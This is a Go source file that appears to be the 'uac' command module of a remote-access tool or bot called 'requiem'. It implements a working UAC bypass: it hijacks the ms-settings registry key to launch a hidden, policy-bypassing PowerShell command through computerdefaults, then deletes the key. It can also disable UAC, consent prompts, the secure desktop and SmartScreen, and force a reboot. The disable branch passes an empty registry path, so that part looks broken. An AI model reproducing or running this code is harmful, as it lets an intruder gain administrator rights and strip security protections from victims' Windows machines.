package commands

import (
	"fmt"
	"os"
	"strings"
	"time"

	"requiem/store"
	"requiem/utils"
)

const (
	_MS_SETTINGS       string = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
	_CURRENT_POLICIES  string = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
	_SOFTWARE_POLICIES string = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"
)

func (*AdminCommand) Exec(ctx *store.CommandContext, args []string) {
	content := strings.Join(args, " ")

	if utils.HasFlag(content, "check") {
		ctx.ReplyMsg(fmt.Sprintf("Elevated: %t", store.IsAdmin))
		return
	}

	// if utils.HasFlag(content, "ask") {
	// 	utils.RemoveMutex()

	// 	elevated := funcs.AttempElevate()
	// 	if !elevated {
	// 		utils.CheckMutex()

	// 		ctx.ReplyMsg("🟥 User did not accept the UAC prompt.")
	// 		return
	// 	}

	// 	ctx.ReplyMsg("🟩 UAC prompt accepted, restarting...")
	// 	return
	// }

	if utils.HasFlag(content, "bypass") {
		ctx.ReplyMsg("Attempting to elevate...")

		command := fmt.Sprintf(
			"powershell -nop -w hidden -ep bypass -c \"& '%s' %s %d\"",
			store.ExecPath,
			store.LAUNCH_KEY,
			os.Getpid(),
		)

		err := utils.RunCommand(
			"reg", "add",
			_MS_SETTINGS,
			"/ve", "/d", command,
			"/f",
		)

		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create registry key (1) - %s", err))
			return
		}

		err = utils.RunCommand(
			"reg", "add",
			_MS_SETTINGS,
			"/v", "DelegateExecute",
			"/d", "",
			"/f",
		)

		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create registry key (2) - %s", err))
			return
		}

		// this took way too fucking long to figure out lmao
		utils.RemoveMutex()

		err = utils.RunCommand("cmd", "/c", "start computerdefaults")
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to run - %s", err))
			return
		}

		time.Sleep(2 * time.Second)

		utils.RunCommand(
			"reg", "delete",
			"HKCU\\Software\\Classes\\ms-settings",
			"/f",
		)

		return
	}

	if utils.HasFlag(content, "disable") {
		if !store.IsAdmin {
			ctx.ReplyMsg("🟥 Administrator privileges are required to do this.")
			return
		}

		err := utils.RunCommand(
			"reg", "add",
			"",
			"/v", "EnableLUA",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable limited user account - %s", err))
		}

		err = utils.RunCommand(
			"reg", "add",
			"",
			"/v", "ConsentPromptBehaviorAdmin",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable consent prompt - %s", err))
		}

		err = utils.RunCommand(
			"reg", "add",
			"",
			"/v", "PromptOnSecureDesktop",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable secure prompt - %s", err))
		}

		err = utils.RunCommand(
			"reg", "add",
			"",
			"/v", "EnableSmartScreen",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable smart screen - %s", err))
		}

		ctx.ReplyMsg("🟩 Successfully disabled UAC related settings.")

		if utils.HasFlag(content, "force") {
			utils.RunCommand("shutdown", "/r", "/f", "/t", "0")
		}

		return
	}

	ctx.ReplyMsg("🟥 Invalid flag.")
}

func (*AdminCommand) Name() string {
	return "uac"
}

func (*AdminCommand) Info() string {
	return "UAC related utilities."
}

type AdminCommand struct{}
